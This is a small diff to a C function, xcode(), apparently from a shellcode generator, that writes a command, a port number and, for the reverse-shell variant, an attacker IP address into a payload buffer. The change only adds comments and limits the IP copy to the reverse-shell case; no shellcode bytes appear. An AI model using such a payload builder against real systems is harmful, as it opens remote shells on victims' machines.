@@ -165,12 +165,15 @@ void xcode(int idx, char *cmd, int port_nbr, u_long ip)
     
     if (idx > SH_IDX) {
       if (idx == CMD_IDX) {
+        // copy command
         memcpy ((void*)&p[code_len], cmd, cmd_len);
       } else {
+        // if port number specified, copy it
         if (port_nbr != 0) {
           memcpy ((void*)&p[port_ofs], &port_nbr, sizeof(uint16_t));
         }
-        if (ip != 0) {
+        // if reverse shell, and ip specified, copy
+        if (idx==RS_IDX && ip != 0) {
           memcpy ((void*)&p[ip_ofs], &ip, sizeof(uint32_t));
         }
       }
